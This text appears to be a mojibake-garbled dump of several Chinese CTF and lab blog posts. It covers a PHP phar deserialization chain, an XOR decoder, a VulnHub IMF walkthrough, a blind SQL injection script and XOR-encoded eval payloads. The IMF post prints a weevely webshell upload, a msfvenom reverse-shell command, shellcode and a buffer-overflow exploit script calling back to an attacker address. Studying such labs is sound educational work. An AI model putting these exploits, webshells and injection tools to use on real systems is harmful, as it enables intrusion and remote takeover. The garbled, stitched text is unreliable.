function.php\næ–‡ä»¶ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 \u0026lt;?php //show_source(__FILE__); include \u0026#34;base.php\u0026#34;; header(\u0026#34;Content-type: text/html;charset=utf-8\u0026#34;); error_reporting(0); function upload_file_do() { global $_FILES; $filename = md5($_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;].$_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;]).\u0026#34;.jpg\u0026#34;; //mkdir(\u0026#34;upload\u0026#34;,0777); if(file_exists(\u0026#34;upload/\u0026#34; . $filename)) { unlink($filename); } move_uploaded_file($_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;],\u0026#34;upload/\u0026#34; . $filename); echo \u0026#39;\u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt;alert(\u0026#34;ä¸Šä¼ æˆåŠŸ!\u0026#34;);\u0026lt;/script\u0026gt;\u0026#39;; } function upload_file() { global $_FILES; if(upload_file_check()) { upload_file_do(); } } function upload_file_check() { global $_FILES; $allowed_types = array(\u0026#34;gif\u0026#34;,\u0026#34;jpeg\u0026#34;,\u0026#34;jpg\u0026#34;,\u0026#34;png\u0026#34;); $temp = explode(\u0026#34;.\u0026#34;,$_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]); $extension = end($temp); if(empty($extension)) { //echo \u0026#34;\u0026lt;h4\u0026gt;è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:\u0026#34; . \u0026#34;\u0026lt;h4/\u0026gt;\u0026#34;; } else{ if(in_array($extension,$allowed_types)) { return true; } else { echo \u0026#39;\u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt;alert(\u0026#34;Invalid file!\u0026#34;);\u0026lt;/script\u0026gt;\u0026#39;; return false; } } } ?\u0026gt; base.php\nå‰ç«¯å±•ç¤º 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;?php session_start(); ?\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;web3\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;nav class=\u0026#34;navbar navbar-default\u0026#34; role=\u0026#34;navigation\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container-fluid\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;navbar-header\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;navbar-brand\u0026#34; href=\u0026#34;index.php\u0026#34;\u0026gt;é¦–é¡µ\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;ul class=\u0026#34;nav navbar-nav navbra-toggle\u0026#34;\u0026gt; \u0026lt;li class=\u0026#34;active\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;file.php?file=\u0026#34;\u0026gt;æŸ¥çœ‹æ–‡ä»¶\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;upload_file.php\u0026#34;\u0026gt;ä¸Šä¼ æ–‡ä»¶\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;ul class=\u0026#34;nav navbar-nav navbar-right\u0026#34;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;index.php\u0026#34;\u0026gt;\u0026lt;span class=\u0026#34;glyphicon glyphicon-user\u0026#34;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;?php echo $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;];?\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/nav\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;!--flag is in f1ag.php--\u0026gt; class.php\né­”æ³•æ–¹æ³•å‡ºç°æœ€å¤šçš„ä¸€ä¸ªphpæ–‡ä»¶ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 \u0026lt;?php class C1e4r { public $test; public $str; public function __construct($name) { $this-\u0026gt;str = $name; } public function __destruct() { $this-\u0026gt;test = $this-\u0026gt;str; echo $this-\u0026gt;test; } } class Show { public $source; public $str; public function __construct($file) { $this-\u0026gt;source = $file; echo $this-\u0026gt;source; } public function __toString() { $content = $this-\u0026gt;str[\u0026#39;str\u0026#39;]-\u0026gt;source; return $content; } public function __set($key,$value) { $this-\u0026gt;$key = $value; } public function _show() { if(preg_match(\u0026#39;/http|https|file:|gopher|dict|\\.\\.|f1ag/i\u0026#39;,$this-\u0026gt;source)) { die(\u0026#39;hacker!\u0026#39;); } else { highlight_file($this-\u0026gt;source); } } public function __wakeup() { if(preg_match(\u0026#34;/http|https|file:|gopher|dict|\\.\\./i\u0026#34;, $this-\u0026gt;source)) { echo \u0026#34;hacker~\u0026#34;; $this-\u0026gt;source = \u0026#34;index.php\u0026#34;; } } } class Test { public $file; public $params; public function __construct() { $this-\u0026gt;params = array(); } public function __get($key) // ä¼ å…¥ç‚¹ { return $this-\u0026gt;get($key); } public function get($key) { if(isset($this-\u0026gt;params[$key])) { $value = $this-\u0026gt;params[$key]; } else { $value = \u0026#34;index.php\u0026#34;; } return $this-\u0026gt;file_get($value); } public function file_get($value) { $text = base64_encode(file_get_contents($value)); // ä»»æ„æ–‡ä»¶è¯»å–ç‚¹ return $text; } } ?\u0026gt; è°ƒç”¨Testç±»ä¸­çš„file_get()æ–¹æ³•ä»»æ„æ–‡ä»¶è¯»å–ï¼Œget()ä¼šè°ƒç”¨file_get()æ–¹æ³•ï¼Œä¼ å…¥$valueå‚æ•°ï¼Œifåˆ¤æ–­$this-\u0026gt;params[$key]æ˜¯å¦æœ‰å€¼ï¼Œæ²¡æœ‰åˆ™ä¼ index.phpç»™file_getå»è¯»å–ã€‚ä½†æ˜¯å‰é¢è¿˜æœ‰ä¸€ä¸ªæ„é€ å‡½æ•°__contruct()ï¼Œå®šä¹‰paramsä¸ºä¸€ä¸ªæ•°ç»„ï¼Œ__getåˆ™å»è°ƒç”¨get()æ–¹æ³•ï¼Œæ‰€ä»¥åªè¦è§¦å‘__get() æ–¹æ³•å³å¯ï½ ï¼Œ__get() é­”æœ¯æ–¹æ³•åœ¨è¯»å–ä¸å­˜åœ¨çš„å±æ€§è‡ªåŠ¨è§¦å‘ï¼\n1 2 Test::__construct() Test::__get() --\u0026gt; get() --\u0026gt; file_get().file_get_contents() // è¯»å–æ–‡ä»¶ Showç±»ä¸­çš„__toString()ä¸­çš„$content = $this-\u0026gt;str['str']-\u0026gt;sourceåˆ™æ˜¯è·å–ä¸€ä¸ªå«sourceçš„å±æ€§ã€‚å‡è®¾str['str'] = new Test()è¯»å–ä¸å­˜åœ¨çš„å±æ€§sourceåˆšå¥½å°±èƒ½è§¦å‘__get()æ–¹æ³•ï¼\n__toString()æŠŠå¯¹è±¡å½“æˆå­—ç¬¦è¾“å‡ºè‡ªåŠ¨è§¦å‘ï½ï¼Œåœ¨C1e4rä¸­__destruct()å¯¹è±¡è¢«é”€æ¯è§¦å‘ï¼Œèƒ½æ‰“å°è¾“å‡ºå€¼ï¼Œåªè¦è®¾ç½®$this-\u0026gt;testä¸ºnew show()å¯¹è±¡å³å¯ï¼Œ\n1 2 3 # æ„é€  C1e4r::__destruct --\u0026gt; Show::toString() --\u0026gt; Test::__get() --\u0026gt;get()--\u0026gt;file_get_contents() POPï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 \u0026lt;?php class C1e4r { public $test; public $str; } class Show { public $source; public $str; } class Test { public $file; public $params; } $c = new C1e4r(); $show = new Show(); $test = new Test(); $test-\u0026gt;parms[\u0026#39;source\u0026#39;]=\u0026#34;/var/www/html/f1ag.php\u0026#34;; // ä¸ºä»€ä¹ˆè®¾ç½®\u0026#39;source\u0026#39;? å› ä¸º: $this-\u0026gt;str[\u0026#39;str\u0026#39;]-\u0026gt;source; $c-\u0026gt;str = $show; $show-\u0026gt;str[\u0026#39;str\u0026#39;]=$test; $phar=new Phar(\u0026#34;mm.phar\u0026#34;); $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#39;\u0026lt;?php __HALT_COMPILER(); ? \u0026gt;\u0026#39;); $phar-\u0026gt;setMetadata($c); $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); // ç”Ÿæˆç­¾å $phar-\u0026gt;stopBuffering(); function.phpé™åˆ¶ä¸Šä¼ çš„æ–‡ä»¶åç¼€ï¼Œä½†æ˜¯åˆ°æœ€åéƒ½ä¼šè¢«å‘½åä¸ºxxxxxx.jpgæ–‡ä»¶ã€‚mm.pharæ”¹æˆpngç»“å°¾ï¼Œ\nä¸Šä¼ æ–‡ä»¶ï¼Œç„¶ååˆ©ç”¨pharä¼ªåè®®http://xxxxx/file.php?file=phar://upload/xxxx.jpg\n","date":"2022-08-04T00:00:00Z","image":"http://main1o.eu.org/luck.png","permalink":"http://main1o.eu.org/p/swpuctf_2018_simplephp/","title":"SWPUCTF_2018_SimplePHP"},{"content":"å¯¹ç§°åŠ å¯† encode:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 #!/usr/bin/env python # -*- coding: utf-8 -*- def encode(ciphertext): flag = \u0026#39;*************\u0026#39; ciphertext = [] for i in range(len(flag)): s = chr(i ^ ord(flag[i])) if i % 2 == 0: s = ord(s) + 10 else: s = ord(s) - 10 ciphertext.append(str(s)) return ciphertext[::-1] ciphertext = [ # 24 \u0026#39;96\u0026#39;, \u0026#39;65\u0026#39;, \u0026#39;93\u0026#39;, \u0026#39;123\u0026#39;, \u0026#39;91\u0026#39;, \u0026#39;97\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;93\u0026#39;, \u0026#39;70\u0026#39;, \u0026#39;102\u0026#39;, \u0026#39;94\u0026#39;, \u0026#39;132\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;112\u0026#39;, \u0026#39;64\u0026#39;, \u0026#39;97\u0026#39;, \u0026#39;88\u0026#39;, \u0026#39;80\u0026#39;, \u0026#39;82\u0026#39;, \u0026#39;137\u0026#39;, \u0026#39;90\u0026#39;, \u0026#39;109\u0026#39;, \u0026#39;99\u0026#39;, \u0026#39;112\u0026#39;] decode:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 #!/usr/bin/env python # -*- coding: utf-8 -*- def decode(ciphertext): flag = \u0026#39;\u0026#39; ciphertext.reverse() for i in range(len(ciphertext)): if i % 2 == 0: s = int(ciphertext[i])-10 else: s = int(ciphertext[i])+10 flag += chr(i^s) return flag ciphertext = [ \u0026#39;96\u0026#39;, \u0026#39;65\u0026#39;, \u0026#39;93\u0026#39;, \u0026#39;123\u0026#39;, \u0026#39;91\u0026#39;, \u0026#39;97\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;93\u0026#39;, \u0026#39;70\u0026#39;, \u0026#39;102\u0026#39;, \u0026#39;94\u0026#39;, \u0026#39;132\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;112\u0026#39;, \u0026#39;64\u0026#39;, \u0026#39;97\u0026#39;, \u0026#39;88\u0026#39;, \u0026#39;80\u0026#39;, \u0026#39;82\u0026#39;, \u0026#39;137\u0026#39;, \u0026#39;90\u0026#39;, \u0026#39;109\u0026#39;, \u0026#39;99\u0026#39;, \u0026#39;112\u0026#39;] if __name__ == \u0026#39;__main__\u0026#39;: f = decode(ciphertext) print(f) ","date":"2022-06-24T00:00:00Z","image":"http://main1o.eu.org/103365922_p0.png","permalink":"http://main1o.eu.org/p/encrypt/","title":"encrypt"},{"content":"Vulnhubé¶æœº éš¾åº¦ï¼šä¸­ç­‰\nä¿¡æ¯æ”¶é›†\n1 2 3 nmap -sV -f 192.168.100.142 é¶æœºåªå¼€æ”¾äº†80æ®µå£ é¡µé¢æºä»£ç ï¼Œæ‰¾åˆ°ç¬¬ä¸€ä¸ªFlag_1\necho \u0026quot;YWxsdGhlZmlsZXM=\u0026quot; | base64 -d,å¾—åˆ°allthefiles\næ–‡ä»¶åç–‘ä¼¼Base64, æ‹¼å‡‘è§£ç \necho \u0026quot;ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==\u0026quot; | base64 -d flag2{aW1mYWRtaW5pc3RyYXRvcg==}\nå†è§£ä¸€ä¸‹å¾—åˆ°imfadministrator ï¼Œ imf çš„adminç™»å½•åœ°å€ï¼Œè®¿é—®\né¡µé¢æç¤ºï¼Œæ²¡æœ‰ä½¿ç”¨SQLï¼Œå¯†ç è¢«ç¼–ç äº† (ä¼¼ä¹åœ¨é¡µé¢æœ‰ä¸€ä¸ªå«\u0026rsquo;Roger\u0026rsquo;\u0026hellip;)\nåœ¨é¦–é¡µçš„ç™»å½•é¡µé¢ä¸‹ä¹Ÿæ˜¯æœ‰3ä¸ªç”¨æˆ·æç¤º\næŒ¨ä¸ªæµ‹è¯•,rmichaels æ˜¯å¯ä»¥ç™»å½•çš„ï¼Œå°±æ˜¯æ²¡æœ‰å¯†ç \né€šè¿‡ä¹‹å‰çš„æç¤ºçŸ¥é“å¯†ç è¢«ç¼–ç çš„ï¼Œé‚£è‚¯å®šè¦è¿›è¡Œæ¯”è¾ƒï¼ŒçŒœæµ‹ä½¿ç”¨strcmp()å‡½æ•°è¿›è¡Œå¯¹æ¯”\nå¯†ç ç›¸ç­‰çš„è¯è¿”å›0ã€‚å¦‚æœå­—ç¬¦ä¸²å’Œæ•°ç»„æ¯”è¾ƒä¹Ÿæ˜¯ä¼šè¿”å›0\næŠ“åŒ…ï¼Œä¼ å…¥æ•°ç»„æµ‹è¯•ã€‚ç»•è¿‡æˆåŠŸ\nFlag3{Y29udGludWVUT2Ntcw==}è§£ç continueTOcms\nç™»å½•æˆåŠŸåï¼Œå‘ç°å•¥éƒ½æ²¡æœ‰\nå°è¯•çˆ†ç ´äºŒçº§ç›®å½•ã€‚\næœ‰æ–‡ä»¶ä¸Šä¼ çš„ç›®å½•ï¼Œä½†æ˜¯æ²¡æœ‰ä¸Šä¼ ç‚¹\nUrlæ˜¯å¯ä»¥ä¼ å‚çš„ï¼Œè¯•è¯•sqlmap\nsqlmap -u \u0026quot;http://192.168.100.142/imfadministrator/cms.php?pagename=disavowlist\u0026quot; --dbs --batch --cookie=\u0026quot;PHPSESSID=fb579gndjr8b3m9hojis09o3r6\u0026quot;\nå¾—åˆ°æ•°æ®åº“ï¼Œæµ‹è¯•adminæ•°æ®åº“ä¸‹çš„å”¯ä¸€è¡¨ pages\nsqlmap -u \u0026quot;http://192.168.100.142/imfadministrator/cms.php?pagename=disavowlist\u0026quot; --batch --cookie=\u0026quot;PHPSESSID=fb579gndjr8b3m9hojis09o3r6\u0026quot; -D admin -T pages --dump\nè®¿é—®å¾—çŸ¥ï¼Œæœ‰ä¸€ä¸ªå›¾ç‰‡ï¼Œæ‰«æå¾—åˆ°Flag4{dXBsb2Fkcjk0Mi5waHA=}è§£ç å¾—uploadr942.php\nè®¿é—®ä¸Šä¼ é¡µé¢ç›®æµ‹åªèƒ½ä¸Šä¼ å›¾ç‰‡ï¼Œå¹¶ä¸”é€šè¿‡æ–‡ä»¶å¤´å’Œæœ«å°¾åˆ¤æ–­ï¼Œæœ‰htaccessæ–‡ä»¶\nä½¿ç”¨weevelyç”Ÿæˆæœ¨é©¬ å¸¦å¯†ç çš„\nweevely generate 1234 shell.php\nåœ¨å¤´éƒ¨æ·»åŠ è¿›è¡Œç»•è¿‡,æºç æœ‰æç¤ºå¾—æ–‡ä»¶å\nè¿æ¥æœ¨é©¬\nweevely http://192.168.100.142/imfadministrator/uploads/8cf3502f3c52.gif 1234\næŸ¥çœ‹Flag5_abc123def.txt\nå¾—åˆ°æç¤ºecho \u0026quot;YWdlbnRzZXJ2aWNlcw==\u0026quot; | base64 -d, è¿˜è¿è¡Œç€ä¸€ä¸ªå«agentçš„æœåŠ¡\næŸ¥çœ‹åŒçº§ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œæ¥å…¥çš„ç«¯å£7482 8279 9467\nå¯¹äºAgentè¿™ä¸ªç¨‹åºçš„åˆ†æ\ng0blin Research: IMF VulnHub Writeup\nOSCP IMF å¾—çŸ¥è¦è¿›è¡Œç«¯å£æ•²é—¨ï¼Œæ‰èƒ½è¿›è¡Œè®¿é—®ä»£ç†çš„ç«¯å£\nç«¯å£ä¿æŠ¤ä»ç«¯å£æ•²é—¨åˆ°å•åŒ…æˆæƒ\næ–¹æ³•ä¸€ï¼š\nä¸‹è½½å·¥å…·git clone https://github.com/grongor/knock.git\nåœ¨KALIè¿›è¡Œç«¯å£æ•²é—¨æµ‹è¯•\u0026hellip;\næ–¹æ³•äºŒï¼š\n1 2 3 4 5 ä½¿ç”¨ncä¾æ­¤å¯¹3ä¸ªç«¯å£è¿›è¡Œè¿æ¥ï¼Œå³å‘é€SYNæ•°æ®åŒ… nc -nv 192.168.100.142 7482 \u0026amp; nc -nv 192.168.100.142 8279 \u0026amp; nc -nv 192.168.100.142 9467 \u0026amp; æ–¹æ³•ä¸‰ï¼š\nä½¿ç”¨ Scapyå·¥å…·æˆ–è€…Pythonçš„Scapy.allæ¨¡å—å‘é€SYNæ•°æ®åŒ…\nå¯¹å¤–å¼€æ”¾äº†ä¸€ä¸ª7788ç«¯å£\nåˆ†æAgentçŸ¥é“éœ€è¦è¿›è¡Œæº¢å‡º\nç”ŸæˆShellCodeï¼Œæº¢å‡ºæ‹¿åˆ°æƒé™\nmsfvenom -p linux/x86/shell_reverse_tcp lhost=192.168.100.101 lport=8877 -f python -b \u0026quot;\\x00\\x0a\\x0d\u0026quot;\n1 2 3 4 5 6 7 8 9 buf = b\u0026#34;\u0026#34; buf += b\u0026#34;\\xba\\x74\\x40\\x7e\\xaf\\xda\\xd6\\xd9\\x74\\x24\\xf4\\x58\\x29\u0026#34; buf += b\u0026#34;\\xc9\\xb1\\x12\\x31\\x50\\x12\\x83\\xe8\\xfc\\x03\\x24\\x4e\\x9c\u0026#34; buf += b\u0026#34;\\x5a\\xf5\\x95\\x97\\x46\\xa6\\x6a\\x0b\\xe3\\x4a\\xe4\\x4a\\x43\u0026#34; buf += b\u0026#34;\\x2c\\x3b\\x0c\\x37\\xe9\\x73\\x32\\xf5\\x89\\x3d\\x34\\xfc\\xe1\u0026#34; buf += b\u0026#34;\\x7d\\x6e\\x9a\\x94\\x15\\x6d\\x63\\x74\\x4b\\xf8\\x82\\xc8\\xf5\u0026#34; buf += b\u0026#34;\\xab\\x15\\x7b\\x49\\x48\\x1f\\x9a\\x60\\xcf\\x4d\\x34\\x15\\xff\u0026#34; buf += b\u0026#34;\\x02\\xac\\x81\\xd0\\xcb\\x4e\\x3b\\xa6\\xf7\\xdc\\xe8\\x31\\x16\u0026#34; buf += b\u0026#34;\\x50\\x05\\x8f\\x59\u0026#34; Pythonè„šæœ¬\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 # /usr/bin/python2 import socket client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) client.connect((\u0026#39;192.168.100.142\u0026#39;, 7788)) client.recv(512) client.send(\u0026#34;48093572\\n\u0026#34;) client.recv(512) client.send(\u0026#34;3\\n\u0026#34;) client.recv(512) buf = b\u0026#34;\u0026#34; buf += b\u0026#34;\\xba\\x74\\x40\\x7e\\xaf\\xda\\xd6\\xd9\\x74\\x24\\xf4\\x58\\x29\u0026#34; buf += b\u0026#34;\\xc9\\xb1\\x12\\x31\\x50\\x12\\x83\\xe8\\xfc\\x03\\x24\\x4e\\x9c\u0026#34; buf += b\u0026#34;\\x5a\\xf5\\x95\\x97\\x46\\xa6\\x6a\\x0b\\xe3\\x4a\\xe4\\x4a\\x43\u0026#34; buf += b\u0026#34;\\x2c\\x3b\\x0c\\x37\\xe9\\x73\\x32\\xf5\\x89\\x3d\\x34\\xfc\\xe1\u0026#34; buf += b\u0026#34;\\x7d\\x6e\\x9a\\x94\\x15\\x6d\\x63\\x74\\x4b\\xf8\\x82\\xc8\\xf5\u0026#34; buf += b\u0026#34;\\xab\\x15\\x7b\\x49\\x48\\x1f\\x9a\\x60\\xcf\\x4d\\x34\\x15\\xff\u0026#34; buf += b\u0026#34;\\x02\\xac\\x81\\xd0\\xcb\\x4e\\x3b\\xa6\\xf7\\xdc\\xe8\\x31\\x16\u0026#34; buf += b\u0026#34;\\x50\\x05\\x8f\\x59\u0026#34; buf += \u0026#34;A\u0026#34; * (168 - len(buf)) buf += \u0026#34;\\x63\\x85\\x04\\x08\\n\u0026#34; client.send(buf) ç›‘å¬æœ¬åœ°~\nFlag6{R2gwc3RQcm90MGMwbHM=}\nåç»­ç™»å½•ä¹‹åï¼Œphpæ–‡ä»¶åˆ†ææŸ¥çœ‹\nupload/index.php\nupload/cmd.php æ³¨å…¥ç‚¹\n","date":"2022-06-24T00:00:00Z","image":"http://main1o.eu.org/%E7%8C%AB%E7%BE%BD%E9%9B%AB.jpg","permalink":"http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/","title":"IMFé¶æœº"},{"content":"ç›²æ³¨demo:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 #!/usr/bin/env python # -*- coding: utf-8 -*- \u0026#39;\u0026#39;\u0026#39; @main1o Sqli_labs_5 \u0026#39;\u0026#39;\u0026#39; import requests payloads = list(\u0026#39;abcdefghijklmnopqrstuvwxyz0123456789_\u0026#39;) code = \u0026#39;You are in...........\u0026#39; def database_name(inject): num = 1 while True: reque = \u0026#34;{inject} and (length(database()) = {str})%23\u0026#34;.format(inject=inject,str=num) reque = requests.get(reque) if code in reque.text: print(f\u0026#34;[+]å½“å‰æ•°æ®åº“é•¿åº¦: {num}\u0026#34;) break else: num += num databa_name = [] for i in range(num+1): for j in payloads: databs_request = \u0026#34;{inject} and (substr(database(),{i},1)=\u0026#39;{j}\u0026#39;)%23\u0026#34;.format(inject=inject,i=i,j=j) databs_request = requests.get(databs_request) if code in databs_request.text: databa_name.append(j) continue return \u0026#39;\u0026#39;.join(databa_name) def table_name(inject,database_name): lens = 1 while True: reques = \u0026#34;{inject} and (select count(table_name) from information_schema.tables where table_schema = \u0026#39;{database_name}\u0026#39;) = \u0026#39;{lens}\u0026#39;%23\u0026#34;. \\ format(inject=inject,database_name=database_name,lens=lens) reques = requests.get(reques) if code in reques.text: print(f\u0026#34;[+]{database_name}ä¸‹æœ‰{lens}ä¸ªè¡¨\u0026#34;) break else: lens += lens lists = [] for i in range(lens): for table_len in range(10): tables_len = \u0026#34;{inject} and (length((select table_name from information_schema.tables where table_schema = \u0026#39;{database_name}\u0026#39; limit {i},1)) = {table_len})%23\u0026#34;. \\ format(database_name=database_name,inject=inject,i=i,table_len=table_len) tables_len = requests.get(tables_len) if code in tables_len.text: lists.append(table_len) break for i in range(len(lists)): list_s = [] for s in range((lists[i]+1)): for j in payloads: tables_name = \u0026#34;{inject} and (substr((select table_name from information_schema.tables where table_schema = \u0026#39;{database_name}\u0026#39; limit {i},1),{s},1) = \u0026#39;{j}\u0026#39;)%23\u0026#34;. \\ format(database_name=database_name,inject=inject,s=s,j=j,i=i) # print(tables_name) tables_name = requests.get(tables_name) if code in tables_name.text: list_s.append(j) continue print(\u0026#34;---\u0026#34;,\u0026#39;\u0026#39;.join(list_s)) if __name__ == \u0026#39;__main__\u0026#39;: inject = input(\u0026#34;[+]æ³¨å…¥ç‚¹(http://xxxx/?id=1\u0026#39;):\u0026#34;) databa_name = database_name(inject) print(f\u0026#39;[+]å½“å‰æ•°æ®åº“:{databa_name}\u0026#39;) table_name(inject,databa_name) ","date":"2022-06-24T00:00:00Z","image":"http://main1o.eu.org/image62.png","permalink":"http://main1o.eu.org/p/sqli_labs_5/","title":"sqli_labs_5"},{"content":"xorè„šæœ¬æµ‹è¯•\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 #!/usr/bin/env python # -*- coding: utf-8 -*- import sys import string import urllib def help(): print(\u0026#34;1.æ•°å­—å¼‚æˆ–\u0026#34;) print(\u0026#34;2.æ‰€æœ‰æ ‡ç‚¹é›†å¼‚æˆ–\u0026#34;) def XOR_1(): payload = input(\u0026#34;payload:\u0026#34;) strlist = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, \\ 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 36, 37, 38, \\ 40, 41, 42, 43, 44, 45, 46, 47, 58, 59, 60, 61, 62, 63, 64, 91, 93, 94, 95, 96, 123, 124, 125, 126, 127] # strlistæ˜¯asciiè¡¨ä¸­æ‰€æœ‰éå­—æ¯æ•°å­—çš„å­—ç¬¦åè¿›åˆ¶ str1,str2 = \u0026#39;\u0026#39;,\u0026#39;\u0026#39; for char in payload: for i in strlist: for j in strlist: if(i ^ j == ord(char)): i = \u0026#39;%{:0\u0026gt;2}\u0026#39;.format(hex(i)[2:]) j = \u0026#39;%{:0\u0026gt;2}\u0026#39;.format(hex(j)[2:]) print(\u0026#34;(\u0026#39;{0}\u0026#39;^\u0026#39;{1}\u0026#39;)\u0026#34;.format(i,j),end=\u0026#34;.\u0026#34;) break else: continue break def XOR_2(): char = string.printable # è¿”å›æ‰€æœ‰æ ‡ç‚¹é›†ï¼Œæ•°å­—ï¼Œascii_letterså’Œç©ºæ ¼ # 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\u0026#34;#$%\u0026amp;\u0026#39;()*+, -./:;\u0026lt;=\u0026gt;?@[\\]^_`{|}~ payload = input(\u0026#34;payload:\u0026#34;) tmp1,tmp2 = \u0026#39;\u0026#39;,\u0026#39;\u0026#39; for res in payload: for i in char: for j in char: if(ord(i)^ord(j) == ord(res)): tmp1 += i tmp2 += j break else: continue break print(\u0026#34;(\u0026#39;{}\u0026#39;^\u0026#39;{}\u0026#39;)\u0026#34;.format(tmp1,tmp2)) if \u0026#34;__main__\u0026#34; == __name__: def demo(argv): if len(argv)\u0026lt;1: help() sys.exit() try: if(sys.argv[1] == \u0026#34;1\u0026#34;): XOR_1() elif(sys.argv[1] == \u0026#34;2\u0026#34;): XOR_2() else: pass except: sys.exit() demo(sys.argv[1:]) ","date":"2022-06-24T00:00:00Z","image":"http://main1o.eu.org/wallhaven-6o6orw_1920x1080.png","permalink":"http://main1o.eu.org/p/xor/","title":"xor"},{"content":"[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME åœ¨çº¿ç¯å¢ƒBUUCTFæœç´¢\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?php error_reporting(0); if(isset($_GET[\u0026#39;code\u0026#39;])){ $code=$_GET[\u0026#39;code\u0026#39;]; if(strlen($code)\u0026gt;40){ die(\u0026#34;This is too Long.\u0026#34;); } if(preg_match(\u0026#34;/[A-Za-z0-9]+/\u0026#34;,$code)){ die(\u0026#34;NO.\u0026#34;); } @eval($code); } else{ highlight_file(__FILE__); } // ?\u0026gt; åˆ†æä»£ç çŸ¥é“ä¼ å…¥çš„å€¼ä¸èƒ½æ˜¯A-Z,a-z,0-9å¹¶ä¸”ä¸èƒ½å¤§äº40ä¸ªå­—ç¬¦\n1 2 3 4 ?code=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();\u0026amp;%ff=phpinfo // è¿™é‡Œè¿›è¡Œå¼‚æˆ–ç»•è¿‡äº† // è¢«è§£æä¸ºï¼š${_GET}{%ff}();\u0026amp;%ff=phpinfo\tå†æ¬¡æ„å»ºpayload\n1 2 3 4 5 6 7 8 9 \u0026lt;?php error_reporting(0); $a=\u0026#39;assert\u0026#39;; $b=urlencode(~$a); echo $b; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; $c=\u0026#39;(eval($_POST[a]))\u0026#39;; $d=urlencode(~$c); echo $d; 1 2 3 4 5 6 